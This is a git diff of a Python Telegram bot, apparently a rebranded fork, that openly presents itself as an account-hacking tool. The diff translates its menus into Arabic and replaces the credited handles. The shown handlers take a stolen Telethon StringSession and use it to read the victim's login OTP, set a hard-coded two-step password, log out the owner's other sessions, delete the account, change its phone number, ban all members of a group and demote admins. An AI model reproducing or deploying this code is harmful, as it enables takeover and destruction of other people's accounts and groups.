@@ -148,61 +148,51 @@ logging.basicConfig(level=logging.WARNING)
 channel = "serrtfhs"
 menu = '''
 ┏━━━━━━━━━❥
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ Uᴘᴅᴀᴛᴇꜱ -> @AmBotYT
+┣ المطور.  ---» @Ky_n0
+┣ السورس  ----»  @KYnX2
 ┗━━━━━━━━━❥
-**Updates JOIN @AmBotYT**
+**انضم للسورس **
 
 
 
-A: [check user own groups and channels]
+A: [التحقق من المجموعات والقنوات الخاصة بالمستخدم]
 
-B: [check user all information like phone number usrname...]
+B: [معلومات الحساب ..]
 
-C: [ban a group {give me StringSession and channel/group username i will ban all members there}]
+C: [تفليش قناة / كروب ]
 
-D: [know user last otp {1st use option B take phone number and login there Account then use me i will give you otp}]
+D: [للحصول على رمز تسجيل الدخول]
 
-E: [Join A Group/Channel via StringSession]
+E: [انضمام الى قتاة او مجموعة ]
 
-F: [Leave A Group/Channel via StringSession]
+F: [مغادرة قناة او مجموعة]
 
-G: [Delete A Group/Channel]
+G: [حذف قناة او مجمعة ]
 
-H: [Check user two step is eneable or disable]
+H: [تحقق من كلمة المرور معكله او مفعله ]
 
-I: [Terminate All current active sessions except Your StringSession]
+I: [تسجيل خروج لجميع الجلسات عدا جلسة البوت ]
 
-J: [Delete Account]
+J: [حذف الحساب ]
 
-K: [Demote all admins in a group/channel]
+K: [تنزيل شخص من الاشراف من قناة او مجموعة]
 
-L: [Promote a member in a group/channel]
+L: [رفع عضو داخل قناة او مجموعة ]
 
-M: [Change Phone number using StringSession]
+M: [تغيير رقم الهاتف الحساب الى رقمك ]
 
-I ADD MORE FEATURES LATER 
 ┏━━━━━━━━━❥
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ About   -> @About_AMBot
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ About   -> @About_AMBot
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ About   -> @About_AMBot
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ About   -> @About_AMBot
+┣ المطور.  ---» @Ky_n0
+┣ السورس  ----»  @KYnX2
 ┗━━━━━━━━━❥
 
 '''
 mm = '''
 ┏━━━━━━━━━❥
-┣ Cʀᴇᴀᴛᴇʀ -> @am_YTbott
-┣ Uᴘᴅᴀᴛᴇꜱ -> @AmBotYT
+┣ المطور.  ---» @Ky_n0
+┣ السورس  ----»  @KYnX2
 ┗━━━━━━━━━❥
-i can hack anybody
-Take his StringSession and use me
-I will give you full power of mine
-Type /hack 
+اهلا بك في بوت اختراق حسابات تيليجرام عبر كود telethon ارسل الامر  /hack 
 '''
 @client.on(events.NewMessage(pattern="/start"))
 async def op(event):
@@ -260,7 +250,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await userinfo(strses.text)
-      await event.reply(i + "\n\nThanks For using @AM_YTBott")
+      await event.reply(i + "\n\nThanks For using @Ky_n0")
     elif r == "C":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -272,7 +262,7 @@ async def start(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await userbans(strses.text, grpid.text)
-      await event.reply("Banning all members Thanks For using @AM_YTBott")
+      await event.reply("Banning all members Thanks For using @Ky_n0")
     elif r == "D":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -282,7 +272,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nThanks For using @AM_YTBott")
+      await event.reply(i + "\n\nThanks For using @Ky_n0")
     elif r == "E":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -294,7 +284,7 @@ async def start(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await joingroup(strses.text, grpid.text)
-      await event.reply("Joined the Channel/Group Thanks For using @AM_YTBott")
+      await event.reply("Joined the Channel/Group Thanks For using @Ky_n0")
     elif r == "F":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -306,7 +296,7 @@ async def start(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await leavegroup(strses.text, grpid.text)
-      await event.reply("Leaved the Channel/Group Thanks For using @AM_YTBott")
+      await event.reply("Leaved the Channel/Group Thanks For using @Ky_n0")
     elif r == "G":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -318,7 +308,7 @@ async def start(event):
       await x.send_message("GIVE GROUP/CHANNEL USERNAME/ID")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("Deleted the Channel/Group Thanks For using @AM_YTBott")
+      await event.reply("Deleted the Channel/Group Thanks For using @Ky_n0")
     elif r == "H":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -329,7 +319,7 @@ async def start(event):
         return await event.respond("This StringSession is terminated maybe")
       i = await user2fa(strses.text)
       if i:
-        await event.reply("User don't have two step thats why now two step is `Abhi12` you can login now\n\nThanks For using @AM_YTBott")
+        await event.reply("User don't have two step thats why now two step is `Abhi12` you can login now\n\nThanks For using @Ky_n0")
       else:
         await event.reply("Sorry User Have two step already")
     elif r == "I":
@@ -341,7 +331,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await terminate(strses.text)
-      await event.reply("The all sessions are terminated\n\nThanks For using @AM_YTBott")
+      await event.reply("The all sessions are terminated\n\nThanks For using @Ky_n0")
     elif res.text == "J":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -351,7 +341,7 @@ async def start(event):
       else:
         return await event.respond("This StringSession is terminated maybe")
       i = await delacc(strses.text)
-      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using @AM_YTBott")
+      await event.reply("The Account is deleted SUCCESSFULLLY\n\nThanks For using @Ky_n0")
     elif res.text == "L":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -365,7 +355,7 @@ async def start(event):
       await x.send_message("NOW GIVE USER USERNAME")
       user = await x.get_response()
       i = await promote(strses.text, grp.text, user.text)
-      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using @AM_YTBott")
+      await event.reply("I am Promoting you in Group/Channel wait a min 😗😗\n\nThanks For using @Ky_n0")
     elif res.text == "K":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -380,7 +370,7 @@ async def start(event):
         i = await demall(strses.text, pro.text)
       except:
         pass
-      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using @AM_YTBott")
+      await event.reply("I am Demoting all members of Group/Channel wait a min 😗😗\n\nThanks For using @Ky_n0")
     elif res.text == "M":
       await x.send_message("GIVE STRING SESSION")
       strses = await x.get_response()
@@ -405,7 +395,7 @@ async def start(event):
         else:
           await event.respond("Something is wrong")
       except Exception as e:
-        await event.respond("SEND THIS ERROR TO -@AM_YTBott\n**LOGS**\n" + str(e))
+        await event.respond("SEND THIS ERROR TO -@Ky_n0\n**LOGS**\n" + str(e))
 
     else:
       await event.respond("Wrong Text Found Re type /hack and use")
